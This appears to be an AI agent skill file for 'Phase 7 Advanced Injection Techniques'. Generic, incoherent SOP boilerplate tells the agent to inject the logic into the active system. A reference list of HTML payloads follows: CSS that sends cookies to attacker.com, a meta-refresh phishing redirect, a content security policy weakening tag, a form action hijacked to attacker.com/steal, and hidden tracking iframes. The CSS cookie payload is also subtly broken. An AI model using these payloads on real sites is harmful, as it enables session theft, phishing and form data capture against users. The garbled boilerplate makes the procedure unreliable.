---
name: phase-7-advanced-injection-techniques
description: Use when executing phase 7 advanced injection techniques protocols within the security sector.
---

# Phase 7 Advanced Injection Techniques: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 7 Advanced Injection Techniques. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 7 advanced injection techniques logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="http://attacker.com/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```